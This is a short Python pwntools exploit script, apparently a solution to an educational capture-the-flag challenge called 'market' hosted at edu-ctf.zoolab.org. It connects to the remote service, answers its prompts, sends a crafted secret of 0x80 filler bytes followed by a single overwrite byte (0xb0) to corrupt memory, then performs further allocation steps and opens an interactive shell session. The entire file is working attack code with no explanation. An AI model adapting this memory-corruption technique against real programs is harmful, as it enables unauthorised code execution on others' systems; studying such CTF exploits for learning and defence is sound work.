from random import vonmisesvariate
from pwn import *

# r = process('./market')
r = remote('edu-ctf.zoolab.org', 30209)

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

r.sendlineafter('need', 'n')
r.sendlineafter('name', 'A')
r.sendlineafter('long', str(0x280))
r.sendafter('secret', b'A' * 0x80 + b'\xb0')
r.sendlineafter('new secret', '4')
r.sendlineafter('long', str(0x10))
r.sendafter('secret', b'A'*0x10)
r.sendlineafter('new secret', '2')

r.interactive()